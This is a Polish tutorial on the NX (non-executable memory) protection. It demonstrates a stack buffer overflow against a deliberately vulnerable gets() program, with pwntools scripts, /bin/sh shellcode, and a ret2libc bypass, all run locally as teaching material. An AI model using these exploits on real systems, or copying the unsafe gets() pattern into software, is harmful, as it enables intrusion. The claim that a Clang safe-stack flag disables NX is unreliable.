# Execution Disable
## Opis
`Execution Disable`, zwane też `Executable space protection`, `NX` lub `W^X` oznacza obszary pamięci jako `non-executable`. Wykonywanie tak oznaczonego kodu spowoduje SEGFAULT oraz zabicie procesu.

Najczęstszą implementacją `Execution Disable` jest `NX bit` - sprzętowa implementacja stosowana w większości procesorów (x86 - intel pod nazwą `XD`, amd pod nazwą `NX bit` oraz ARM - pod nazwą `execute never`).

Możliwa jest też software'owa emulacja (nie na Windowsie) tej funkcjonalności ale wiąże się to ze znacznym spadkiem wydajności.
Niektóre dystrybucje linuxa x86-32bit mają domyślnie wyłączony NX bit (ubuntu, fedora).

NX zapobiega bezpośredniemu wykonywaniu wstrzykniętego na stos kodu. Pomimo tego w przypadku zastosowania niebezpiecznych funkcji nie powstrzymuje nas on przed atakami jedynie sterującymi działaniem programu, np `ret2libc`.

## Clang i GCC

W obydu kompilatorach NX jest defaultowo włączony. W GCC możemy wyłączyć nx przez flagę `-z execstack` a w Clang'u przez flagę `-fno-sanitize=safe-stack`.

## Exploit 1 - BOF z shellcode
### Podatna aplikacja
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func() {
  char input[16];

  printf("Please enter your name: \n");
  gets(input);

  printf("Hi %s\n", input);
}

int main() {
  func();
  return 0;
}
```

W exploicie wykożystuje użycie niebezpiecznej funkcji `gets()` pozwalającej na `BOF`.

Do automatyzacji exploitu wykorzystuje `pwntools`.

### Krok 1

W kroku 1 muszę znaleźć offset po którym zostanie nadpisany rejestr `eip`. Robię to za pomocą funckji [cyclic](https://docs.pwntools.com/en/stable/util/cyclic.html) generującej ciąg znaków `aaaabaaacaaa` dowolnej długości.

```python
io.sendline(cyclic(100, n=4))
io.wait()
core = io.corefile
eip_offset = cyclic_find(pack(core.eip))
info("eip offset = %d", eip_offset)
```

Po crashu pwntoolsy zczytują rejestr eip i sprawdzany jest offset.

![](https://i.imgur.com/Gd71A3S.png)

Do rejestru trafiło `haaa` więc offset to 28.

### Krok 2

Następnie trzeba sprawdzić adres naszego inputu na stosie.

![](https://i.imgur.com/UKGoxvK.png)

Adres naszego shellcode =`0xffffd130 + eip_offset + 4`

### Krok 3

W 3 kroku do naszego inputu doklejamy shellcode. Dla skrócenia kodu używam shellcode generowanego przez pwntools.

Przykładowy shellcode opiera się na wykonaniu syscalla `execve` z argumentem `/bin/sh`.

```nasm
xor eax, eax 
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
push 0xb
pop eax
int 0x80
```

Powyższy przykładowy shellcode zeruje rejestr `eax`, umieszcza string `/bin/sh` na stosie, umieszcza pointer do stringa w `ebx`, zeruje `ecx i edx`, ustawia wartość `0xb` w `eax` oraz wykonuje syscall instrukcją `int 0x80`

Wykonując tak przygotowanego exploita otrzymujemy basha: 

![](https://i.imgur.com/Ge9gu2A.png)

W przypadku zastosowania exploita na aplikacji skompilowanej z nx otrzymujemy segfaulta:

![](https://i.imgur.com/zMg5sk1.png)

## Exploit 2 - ret2libc

Przykładem exploita omijającego nx jest `ret2libc`. Zamiast wykonywać shellcode umieszczony na stosie w tym exploicie odwołamy się jedynie do funkcji `system()` zawartej w `libc` ze stringiem `/bin/sh` również zawartym w libc `libc`.

### Krok 1
Analogicznie do poprzedniego exploita znajdujemy offset. Potem potrzebujemy odnaleźć adresy `libc`, `system()`, `/bin/sh`, oraz `exit()`. Można zrobić to za pomocą gdb albo pwntools.

Skrypt wyszukujący adresy:

```python
libc_addr = core.libc.start

libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")

binsh_addr = next(core.search(b"/bin/sh"))
sys_addr = libc.symbols["system"] + libc_addr
exit_addr = libc.symbols["exit"] + libc_addr
```

### Krok 2
Sklejamy i wysyłamy exploita:

```python
payload = b"a"*eip_offset
payload += p32(sys_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)
```

![](https://i.imgur.com/zJWyOlY.png)

## Wnioski 
NX jest prostym zabezpieczeniem zapobiegającym najprostszym atakom BOF. Nie odbija się negatynie na wydajności więc pomimo łatwości obejścia powinno być ono uniwersalnie implementowane.
